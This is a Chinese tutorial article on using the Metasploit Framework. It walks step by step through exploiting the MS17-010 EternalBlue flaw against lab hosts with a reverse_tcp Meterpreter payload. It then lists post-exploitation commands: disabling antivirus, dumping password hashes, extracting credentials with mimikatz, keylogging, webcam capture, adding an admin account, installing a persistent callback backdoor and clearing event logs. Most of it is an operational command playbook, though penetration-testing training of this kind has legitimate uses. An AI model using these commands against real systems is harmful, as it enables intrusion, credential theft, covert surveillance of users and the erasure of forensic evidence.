> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247483896&idx=1&sn=9468a1c9cd2f3b5ca035ed76a274e538&chksm=eaad81c5ddda08d3842d45067d90bde51fa933b0a488e48dc02f3d0ec79c0b40f3d7f59ad8b7&scene=21#wechat_redirect)

  

Metasploit Framework(MSF) 的使用

目录

Metasploit  

Metasploit 的安装和升级

MSF 中加载自定义的 exploit 模块

漏洞利用 (exploit)

攻击载荷 (payload)

Meterpreter

MS17_010(永恒之蓝)

    Auxiliary 辅助探测模块

    Exploit 漏洞利用模块

    Payload 攻击载荷模块

后渗透阶段

    Post 后渗透模块 

    查看主机是否运行在虚拟机上

    关闭杀毒软件 

    获取目标主机的详细信息

    访问文件系统

    上传 / 下载文件

    权限提升

    获取用户密码

    运行程序

    屏幕截图

    创建一个新账号

    启用远程桌面

    键盘记录

    进程迁移

    禁止目标主机使用键盘鼠标

    用目标主机摄像头拍照

    使用扩展库

    生成持续性后门

    设置 Socks4a 代理

    portfwd 端口转发

    清除事件日志

导入并执行 PowerShell 脚本

加载 stdapi

升级 Session

Meterpreter 的更多用法

  

Metasploit

**`Metasploit Framework(MSF)`**是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit 可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以 “可以黑掉整个宇宙” 之名。刚开始的 Metasploit 是采用 Perl 语言编写的，但是再后来的新版中，改成了用 Ruby 语言编写的了。在 kali 中，自带了 Metasploit 工具。我们接下来以大名鼎鼎的永恒之蓝 MS17_010 漏洞为切入点，讲解 MSF 框架的使用。

**MSF 的更新**：msfupdate

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI096cowpMMC1KHG1Hm2l476TVagRyH61yLhqib7PialGyYoxZ60bSFrVsg/640?wx_fmt=png)

Metasploit 的安装和升级

在一般的 linux 中，默认是不安装 MSF 的。以下是在非 kali 的 Linux 下安装 MSF 框架。

**一键安装**

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall   
adduser msf           #添加msf用户
su msf                #切换到msf用户
cd  /opt/metasploit-framework/bin   #切换到msf所在的目录 
./msfconsole          #以后启动msfconsole，都切换到msf用户下启动，这样会同步数据库。如果使用root用户启动的话，不会同步数据库  
 
也可以将msfconsole加入到执行目录下，这样在任何目录直接msfconsole就可以了
ln -s /opt/metasploit-framework/bin/msfconsole /usr/bin/msfconsole
 
#备注：
#初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联，这也这也就是需要新建用户msf来运行metasploit的原因所在。如果你一不小心手一抖，初次运行是在root用户下，请使用 msfdb reinit 命令，然后使用非root用户初始化数据库。        
 
MSF后期的升级：msfupdate
```

**使用方法：**

*   进入框架：msfconsole
    
*   使用 search 命令查找相关漏洞： search  ms17-010
    
*   使用 use 进入模块:  use exploit/windows/smb/ms17_010_eternalblue   
    
*   使用 info 查看模块信息： info 
    
*   设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp
    
*   查看模块需要配置的参数：show options
    
*   设置参数：set  RHOST  192.168.125.138
    
*   攻击：exploit /  run
    
*   后渗透阶段
    

不同的攻击用到的步骤也不一样，这不是一成不变的，需要灵活使用。

我们也可以将攻击代码写入 configure.rc（只要是以 .rc 结尾的文件）配置文件中，然后使用命令 msfconsole  -r   configure.rc  进行自动攻击！

MSF 中加载自定义的 exploit 模块

参考文章：CVE-2019-0708 远程桌面漏洞复现   ，该文中介绍了如果加载自定义的 exploit 模块并且成功攻击。

漏洞利用 (exploit)

漏洞利用 exploit，也就是我们常说的 exp，他就是对漏洞进行攻击的代码。

exploit 漏洞利用模块路径：**/usr/share/metasploit-framework/modules/exploits**

**![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI01vrm6RdPodDh1cHehAsAdVicEaUV6bosUr4icMmYBGOk7oUQoCuncPlg/640?wx_fmt=png)**

这里面有针对不同平台的 exploit 。

我们现在就进 windows 平台看看，这里会列出针对 windows 平台不同服务的漏洞利用

**![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0r48eibMDfgqicbx3jyNwnzM3u7Cd0INQYTL5npwVpVBTFvUDPwuKjOlg/640?wx_fmt=png)**

我们进入 smb 服务，这是 windows 中经常爆出漏洞的服务，比如我们的永恒之蓝漏洞就在这里面。

漏洞利用代码是以 rb 结尾的文件，因为 metasploit 是用 Ruby 语言编写的。

**![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0Ad4A2VMKjf0k8Hf78VIic6p1qfGjojf5WgqTPqqIXfIjpAbXE0Q99kA/640?wx_fmt=png)**

**攻击载荷 (payload)**

**payload 模块路径：/usr/share/metasploit-**framework/modules/payloads

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0h4ccKogZib4aXQ0iafnVdSibgplBrf0qLxfiaqeygjFuLv6BmEaRvPwwrA/640?wx_fmt=png)

Payload 中包含攻击进入目标主机后需要在远程系统中运行的恶意代码，而在 Metasploit 中 Payload 是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。简而言之，这种漏洞利用模块可以访问目标系统，而其中的代码定义了 Payload 在目标系统中的行为。

**Shellcode** ：Shellcode 是 payload 中的精髓部分，在渗透攻击时作为攻击载荷运行的一组机器指令。Shellcode 通常用汇编语言编写。在大多数情况下，目标系统执行了 shellcode 这一组指令 之后，才会提供一个命令行 shell。

Metasploit 中的 Payload 模块主要有以下三种类型：

```
-Single
-Stager
-Stage
```

*   Single 是一种完全独立的 Payload，而且使用起来就像运行 calc.exe 一样简单，例如添加一个系统用户或删除一份文件。由于 Single Payload 是完全独立的，因此它们有可能会被类似 netcat 这样的非 metasploit 处理工具所捕捉到。
    
*   Stager 这种 Payload 负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的 Stager Payload 就是 reverse_tcp，它可以让目标系统与攻击者建立一条 tcp 连接，让目标系统主动连接我们的端口 (反向连接)。另一种常见的是 bind_tcp，它可以让目标系统开启一个 tcp 监听器，而攻击者随时可以与目标系统进行通信 (正向连接)。
    
*   Stage 是 Stager Payload 下的一种 Payload 组件，这种 Payload 可以提供更加高级的功能，而且没有大小限制。
    

在 Metasploit 中，我们可以通过 Payload 的名称和使用格式来推断它的类型：

```
Single Payload的格式为：<target>/ <single>  如：windows/powershell_bind_tcp
Stager/Stage Payload的格式为：<target>/ <stage> / <stager>  如：windows/meterpreter/reverse_tcp
```

当我们在 Metasploit 中执行 show  payloads 命令之后，它会给我们显示一个可使用的 Payload 列表：

在这个列表中，像 windows/powershell_bind_tcp 就是一个 Single Payload，它不包含 Stage Payload

而 windows/meterpreter/reverse_tcp 则由一个 **Stage Payload（meterpreter**）和 一个 **Stager Payload（reverse_tcp）**组成

**Stager 中几种常见的 payload**

```
windows/meterpreter/bind_tcp       #正向连接
windows/meterpreter/reverse_tcp    #反向连接，常用
windows/meterpreter/reverse_http   #通过监听80端口反向连接
windows/meterpreter/reverse_https  #通过监听443端口反向连接
 
正向连接使用场景：我们的攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了。但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了80端口。那么，我们就只能设置正向连接80端口了，这里很有可能失败，因为80端口上的流量太多了
 
反向连接使用场景：我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了。如果是这样的情况，建议使用反向连接，因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量。
 
反向连接80和443端口使用场景：被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置的特别严格，就连被攻击机访问外部网络的流量也进行了严格的限制，只允许被攻击机的80端口或443端口与外部通信
```

Meterpreter

Meterpreter 属于 stage payload，在 Metasploit Framework 中，Meterpreter 是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型 Payload。这种工具是基于 “内存 DLL 注入” 理念实现的，它能够通过创建一个新进程并调用注入的 DLL 来让目标系统运行注入的 DLL 文件。

Meterpreter 是如何工作的？

首先目标先要执行初始的溢出漏洞会话连接，可能是 bind 正向连接，或者反弹 reverse 连接。反射连接的时候加载 dll 链接文件，同时后台悄悄处理 dll 文件。其次 Meterpreter 核心代码初始化, 通过 socket 套接字建立一个 TLS/1.0 加密隧道并发送 GET 请求给 Metasploit 服务端。Metasploit 服务端收到这个 GET 请求后就配置相应客户端。最后，Meterpreter 加载扩展，所有的扩展被加载都通过 TLS/1.0 进行数据传输。

Meterpreter 的特点：

*   Meterpreter 完全驻留在内存，没有写入到磁盘
    
*   Meterpreter 注入的时候不会产生新的进程，并可以很容易的移植到其它正在运行的进程
    
*   默认情况下， Meterpreter 的通信是加密的，所以很安全
    
*   扩展性，许多新的特征模块可以被加载。
    

我们在设置 payloads 时，可以将 payloads 设置为：windows/meterpreter/reverse_tcp  ，然后获得了 meterpreter> 之后我们就可以干很多事了！具体的做的事，在我们下面的后渗透阶段都有讲！

MS17_010(永恒之蓝)

我们现在模拟使用 MS17_010 漏洞攻击，这个漏洞就是去年危害全球的勒索病毒利用的永恒之蓝漏洞。

kali 控制台输入：msfconsole     进入 metasploit 框架

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0oU9yAnS7OU5yhjqXUzhjbaqSpc4yaxzMFPpQSqcUBYjElcaoG8cdSg/640?wx_fmt=png)

寻找 MS17_010 漏洞： search ms17_010 

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI03Whic3nquFUGkDicolTTJic4ekB8AG3duj4FvOeRGylyVTaOibt8fLbVRw/640?wx_fmt=png)

这里找到了两个模块，第一个辅助模块是探测主机是否存在 MS17_010 漏洞，第二个是漏洞利用模块，我们先探测哪些主机存在漏洞 

Auxiliary 辅助探测模块

该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。

输入命令：use auxiliary/scanner/smb/smb_ms17_010

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0eLTGy4ooNAPY3VvBokAFaiaOQ6qGcf1dia8wooKr5ZUxaicxdyIibdbnoA/640?wx_fmt=png)

查看这个模块需要配置的信息：show options

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0gia9yvGc9Ja95S2pvh4jPr0UnyE9rGHjIvhEPIQ6unmwYQ9twCStOWA/640?wx_fmt=png)

RHOSTS 参数是要探测主机的 ip 或 ip 范围，我们探测一个 ip 范围内的主机是否存在漏洞

输入：set  RHOSTS  192.168.125.125-129.168.125.140

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0zSXRJkNjI0oiaBMbuvxhbOJ4wK6QUsI8B9yNclQCZRiceXlbVtLK1kOg/640?wx_fmt=png)

输入：exploit   攻击，这里有 + 号的就是可能存在漏洞的主机，这里有 3 个主机存在漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0CxTFtNUHL4jfBZ905b4xH4X4PbwwrRqnIKNbkNSdn5TCEYQOXhAa8Q/640?wx_fmt=png)

Exploit 漏洞利用模块

然后我们就可以去利用漏洞攻击了，选择漏洞攻击模块：use exploit/windows/smb/ms17_010_eternalblue   

查看这个漏洞的信息：info

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0m3m1vbicDeoqNf2mTIewCFfluuW2zPkuQzxkkjsyjjGTENF8RbabfVw/640?wx_fmt=png)

查看可攻击的系统平台，这个命令显示该攻击模块针对哪些特定操作系统版本、语言版本的系统：show targets

这里只有一个，有些其他的漏洞模块对操作系统的语言和版本要求的很严，比如 MS08_067，这样就要我们指定目标系统的版本的。如果不设置的话，MSF 会自动帮我们判断目标操作系统的版本和语言 (利用目标系统的指纹特征)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0KiaLs6ZHl09vPIWQb6rgXmG0LgtdvJRs0BqRAzwQxuicbSEtozxMQusQ/640?wx_fmt=png)

Payload 攻击载荷模块

攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令。

查看攻击载荷：show  payloads

该命令可以查看当前漏洞利用模块下可用的所有 Payload

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0NNWQwKhsiauQExWYqbdTR7OXqVZQiabQEVgDPnkC0v8Vowbib0CVN69gA/640?wx_fmt=png)

设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0oC6zd5BicErKKicb1kJIibBbziamFbfBFH3ThaYj8fAq24zWLMxa8AxQFg/640?wx_fmt=png)

查看模块需要配置的参数： show  options

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0vL9UwTh96VJwiboWnObHAjuI4icoVqzXWDYRbOulowociciaBETL9nCjibQ/640?wx_fmt=png)

设置 RHOST，也就是要攻击主机的 ip：set   RHOST  192.168.125.138

设置 LHOST，也就是我们主机的 ip，用于接收从目标机弹回来的 shell：set  LHOST 192.168.125.129

如果我们这里不设置 lport 的话，默认是 4444 端口监听

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0XrzXE4PDom1zkYNw9gvrnrT6m2pCEmQ79WauUwLuYPmgYImkH56U3A/640?wx_fmt=png)

攻击：exploit 

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI065dMOah72sicAvHcBIZfvbeheBibfKho15Y3MeMaKmHZEK03O0b7F2gw/640?wx_fmt=png)

后渗透阶段

运行了 exploit 命令之后，我们开启了一个 reverse TCP 监听器来监听本地的 4444 端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。运行成功之后，我们将会看到命令提示符 meterpreter > 出现，我们输入： shell  即可切换到目标主机的 windows shell，要想从目标主机 shell 退出到 meterpreter ，我们只需输入：exit

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0dCG5tJJ3uEsOphTd43cTwz8LqZR6SlBPo31FiakhGPlZnZLcTjxibKvg/640?wx_fmt=png)

我们要想从 meterpreter 退出到 MSF 框架，输入：background

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0Eujicia4VsKicBmxL1PSPb1utDeI1ZibOOFvuMicLkStQgGxJfBsvStT9zw/640?wx_fmt=png)

输入： sessions  -l       查看我们获得的 shell，前面有 id

输入： sessions  -i  1     即可切换到 id 为 1 的 shell

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0OcYWJyhz9BDUJwuS2NGf6eoIX7zy0mmO9ruTqKhC2iaTEzp1O7iaFNXw/640?wx_fmt=png)

```
sysinfo             #查看目标主机系统信息
run scraper         #查看目标主机详细信息
run hashdump        #导出密码的哈希
load kiwi           #加载mimikatz
ps                  #查看目标主机进程信息
pwd                 #查看目标当前目录(windows)
getlwd              #查看目标当前目录(Linux)
search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件
download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下
upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下
getpid              #查看当前Meterpreter Shell的进程PID
migrate 1384        #将当前Meterpreter Shell的进程迁移到PID为1384的进程上
idletime            #查看主机运行时间
getuid              #查看获取的当前权限
getsystem           #提权
run  killav         #关闭杀毒软件
screenshot          #截图
webcam_list         #查看目标主机的摄像头
webcam_snap         #拍照
webcam_stream       #开视频
execute  参数  -f 可执行文件   #执行可执行程序
run getgui -u hack -p 123    #创建hack用户，密码为123
run getgui -e                #开启远程桌面
keyscan_start                #开启键盘记录功能
keyscan_dump                 #显示捕捉到的键盘记录信息
keyscan_stop                 #停止键盘记录功能
uictl  disable  keyboard     #禁止目标使用键盘
uictl  enable   keyboard     #允许目标使用键盘
uictl  disable  mouse        #禁止目标使用鼠标
uictl  enable   mouse        #允许目标使用鼠标
load                         #使用扩展库
run                     #使用扩展库
 
run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀
portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址
clearev                       #清除日志
```

Post 后渗透模块 

该模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。

```
run post/windows/manage/migrate           #自动进程迁移
run post/windows/gather/checkvm           #查看目标主机是否运行在虚拟机上
run post/windows/manage/killav            #关闭杀毒软件
run post/windows/manage/enable_rdp        #开启远程桌面服务
run post/windows/manage/autoroute         #查看路由信息
run post/windows/gather/enum_logged_on_users    #列举当前登录的用户
run post/windows/gather/enum_applications       #列举应用程序
run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码
run windows/gather/smart_hashdump               #dump出所有用户的hash
```

输入：sysinfo   查看目标主机的信息

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0RYBJuibbkx8EibVbIa0ibh3ArdLVv631UBgbaYzIM1sQyHWkiaBLk7FNNw/640?wx_fmt=png)

查看主机是否运行在虚拟机上

```
run post/windows/gather/checkvm
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0kwiaz1iaCWgdXjztuibV3iaLibvCsaIWN0gdDKjlbQm4YHtiahvYr1ydJZmg/640?wx_fmt=png)

关闭杀毒软件 

```
run  killav
```

拿到目标主机的 shell 后第一件事就是关闭掉目标主机的杀毒软件，通过命令：

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0ZGBkksUnVnpibNxyunX9l34YEeLyddW2feDZz0mS0HdTt99XnEcv1Yw/640?wx_fmt=png)

获取目标主机的详细信息

```
run scraper 
```

使用命令：

它将目标机器上的常见信息收集起来然后下载保存在本地

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0yYP8ceJ1iaQO0kGicUOt9lz7ujRicAhT6LPnf9YWQ04UpMvOX3qqVzia0A/640?wx_fmt=png)

访问文件系统

Meterpreter 支持非常多的文件系统命令（基本跟 Linux 系统命令类似），一些常用命令如下：

```
cd：切换目标目录；

cat：读取文件内容；

rm：删除文件；

edit：使用vim编辑文件

ls：获取当前目录下的文件；

mkdir：新建目录；

rmdir：删除目录；
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0amKlkRiaShia3hA0a4OZLjHuHmBl8Kq10k7SQlkmnysajUQg9iaELhgyQ/640?wx_fmt=png)

上传 / 下载文件

download  file 命令可以帮助我们从目标系统中下载文件

upload  file 命令则能够向目标系统上传文件。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0yUYOBpmuBkrAVTXmEBiad97x39orBuSwvj25cHqSpJDKXvgEaonAD8g/640?wx_fmt=png)

权限提升

有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而 Meterpreter 给我们提供了一个 getsystem 命令，它可以使用多种技术在目标系统中实现提权：

getuid  命令可以获取当前用户的信息，可以看到，当我们使用 getsystem 进行提权后，用户身材为  NT AUTHORITY\SYSTEM ，这个也就是 Windows 的系统权限。

注：执行 getsystem 命令后，会显示错误，但是其实已经运行成功了！

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0yiaZ3XPxzcMQOvWpkKZ1uEhyB81csdqn2am0IVQyKu5KRFn3xvFibf5Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0uOwbTj5QjYU9pJZJ0GC2TvqIFxKeZOEn1ZqF406gQxgTTAypmxH4Tg/640?wx_fmt=png)

**1：**很多用户习惯将计算机设置自动登录，可以使用  `run windows/gather/credentials/windows_autologin` 抓取自动登录的用户名和密码

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0L7wHJQNYcAmmhDyFZ6vDFER0D6icPcibBzPOwZj7HP3SibyqKKTYG9IfA/640?wx_fmt=png)

**2：**hashdump 模块可以从 SAM 数据库中导出本地用户账号，执行：run hashdump ，该命令的使用需要**系统权限**

**![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0WLlG3G7uPKCbyO6yD9MJVFnwa0XsYe0q5OZOiajeTII3sAO5jOXNHPw/640?wx_fmt=png)**

还可以使用命令：run windows/gather/smart_hashdump  ，，该命令的使用需要**系统权限，**该功能更强大，可以导出域内所有用户的 hash

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0w2H9XyMKQjgYJ6CqttX14Yic7rkLbavI63wD5VSprRkrMOYUowUnZ8A/640?wx_fmt=png)

数据的输出格式为：用户名：SID：LM 哈希：NTLM 哈希::: ，所以我们得到了三个用户账号，分别为 Administrator、Guest 和小谢

其中的 LM 哈希（aad3b435b51404eeaad3b435b51404ee）和 NTLM 哈希（31d6cfe0d16ae931b73c59d7e0c089c0）对应的是一个空密码。

接下来要处理的就是用户 小谢 的密码（ a86d277d2bcd8c8184b01ac21b6985f6 ）了。我们可以使用类似 John the Ripper 这样的工具来破解密码。

**3：**我们还可以通过上传 mimikatz 程序，然后执行 mimikatz 程序来获取明文密码。

执行 mimikatz 必须 **System 权限**。

我们先 getsystem 提权至系统权限，然后执行  execute  -i  -f  mimikatz.exe ，进入 mimikatz 的交互界面。然后执行：

*   privilege::debug
    
*   sekurlsa::logonpasswords
    

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI053vVicqafusUTyzezzCaNAYfKYCn7zyqxlEMkH7Jh1BibnxfvWic2UE1g/640?wx_fmt=png)

**4：**加载 kiwi 模块，该模块的使用需要 **System 权限**，load kiwi  查看该 kiwi 模块的用法：help kiwi

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI05jkw2XsDM1xuI2Rudh3dvAG7gicUTp5Hw7muEQI0ALJefjAcHYErnVg/640?wx_fmt=png)

列举出所有证书的凭证：creds_all

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0dMjcTKcnPlO5Swl7UTEujf9u8nHQfxhluMXxPAAz0IfVSSHibzTSE0g/640?wx_fmt=png)

但是有时候内存中没有证书，这样也获取不到

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0oSiat7xia30nIuaCRhzaqbVBKt57ibEOsZgczFhbf1QZ9sCyhKW4r2bcw/640?wx_fmt=png)

**5：**或者运行 MSF 里面自带的 mimikatz 模块 ，该模块的使用需要 **System 权限**。传送门：MSF 中 mimikatz 模块的使用

运行程序

先查看目标主机安装了哪些应用

run post/windows/gather/enum_applications

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI07pDLgN3hKcWbIjs2uZTm8w7IuNu1eDoSUOic9s6mBA6zNiaIhyk5ygibw/640?wx_fmt=png)

我们还可以使用  execute 命令在目标系统中执行应用程序。这个命令的使用方法如下：

```
execute  参数  -f 可执行文件
```

运行后它将执行所指定的命令。可选参数如下：

```
-f：指定可执行文件

-H：创建一个隐藏进程

-a：传递给命令的参数

-i：  跟进程进行交互

-m：从内存中执行

-t： 使用当前伪造的线程令牌运行进程

-s： 在给定会话中执行进程
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0b2Aran5A1e9WRTvJ903Jba9CHAS57EVsyrnqGPRoZkPMfpjuCpxB9w/640?wx_fmt=png)

屏幕截图

输入：screenshot  ，截图目标主机屏幕，可以看到，图片被保存到了　/root 目录下

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0qNOcgJwHuAhyq51DPdB5Kic9R7KCzTvLV9dw6STwpl9c7icwr0D8STaA/640?wx_fmt=png)

### 创建一个新账号

先查看目标主机有哪些用户

run post/windows/gather/enum_logged_on_users

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0gkbwLsxQicQ6jIoa4mHLaE5o5HvUbr2wMA6Mqibh1ibdUFRQlbCq9ic1Kw/640?wx_fmt=png)

接下来，我们可以在目标系统中创建一个新的用户账号：run getgui -u hack -p 123，这个命令会创建用户，并把他添加到 Administrators 组中，这样该用户就拥有远程桌面的权限了。

这里成功创建了用户，但是添加到 Administrators 组中失败了 !

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0G1uwI4bOsuP9NRrf8tVh7daiaLGCh5hXX9ibtDyZfXn4ico6TS806ldGw/640?wx_fmt=png)

如果添加到 Administrators 组中失败了的话，我们可以运行：shell ，进行 cmd 窗口手动将该用户添加到 administrators 组中。

###   

### 启用远程桌面

当我们新添加的用户已经拥有远程桌面之后，我们就可以使用这个账号凭证来开启远程桌面会话了。

首先，我们需要确保目标 Windows 设备开启了远程桌面功能（需要开启多个服务），不过我们的 getgui 脚本可以帮我们搞定。我们可以使用 - e 参数确保目标设备开启了远程桌面功能（重启之后同样会自动开启），我们输入： run getgui -e  或者  run post/windows/manage/enable_rdp

在开启远程桌面会话之前，我们还需要使用 “idletime” 命令检查远程用户的空闲时长： idletime

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0VZQoyqUo0u8OvxanVmDhjGJhLHbwuoiapIj6ht8a2GtYEbJpzBKFCBA/640?wx_fmt=png)

然后我们就可以使用远程桌面用我们创建的用户远程登录目标主机了。由于上一步创建的用户没有被添加到远程桌面用户组中，所以这一步就没法演示。 

###   

### 键盘记录

```
keyscan_start：开启键盘记录功能

keyscan_dump：显示捕捉到的键盘记录信息

keyscan_stop：停止键盘记录功能
```

Meterpreter 还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令：

不过在使用键盘记录功能时，通常需要跟目标进程进行绑定，接下来我们介绍如何绑定进程，然后获取该进程下的键盘记录 

###   

### 进程迁移

Meterpreter 既可以单独运行，也可以与其他进程进行绑定。因此，我们可以让 Meterpreter 与类似 explorer.exe 这样的进程进行绑定，并以此来实现持久化。

在下面的例子中，我们会将 Meterpreter 跟 winlogon.exe 绑定，并在登录进程中捕获键盘记录，以获得用户的密码。

首先，我们需要使用： ps  命令查看目标设备中运行的进程：

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0trpcxTLWiarPuHqTYZZ0lKic0Fw9bASeiaS8Cv6k83ntWsGnNtWrn7PMw/640?wx_fmt=png)

我们可以使用：  getpid  查看我们当前的进程 id

使用：migrate  目标进程 ID 命令来绑定目标进程 id，这里绑定目标 pid 的时候，经常会断了 shell。进程迁移后会自动关闭原来进程，没有关闭可使用  kill  pid  命令关闭进程。或者使用自动迁移进程（`run post/windows/manage/migrate`）命令，系统会自动寻找合适的进程然后迁移。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0n9P17ib1xm3Sm7XD2vWicJaLoPjCRyPREc7iaQJhhlX7yROgZAgb8Uzvg/640?wx_fmt=png)

绑定完成之后，我们就可以开始捕获键盘数据了，可以看到，用户输入了 123 然后回车，说明密码是 123

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2c3DiaM9QCxKoyicFO5whsOI0iawB30XTics9pnLXqKEQnJMoia6ic8jbsvkcwGW43jaTey5S6nAxn0CeXw/640?wx_fmt=png)

###   

### 禁止目标主机使用键盘鼠标

*   禁止 (允许) 目标使用键盘： uictl  disable (enable) keyboard
    
*   禁止 (允许) 目标使用鼠标：uictl  disable (enable) mouse
    

###   

### 用目标主机摄像头拍照

*   获取目标系统的摄像头列表：webcam_list
    
*   从指定的摄像头，拍摄照片：webcam_snap
    
*   从指定的摄像头，开启视频：webcam_stream
    

可以看到啊，目标主机有一个摄像头

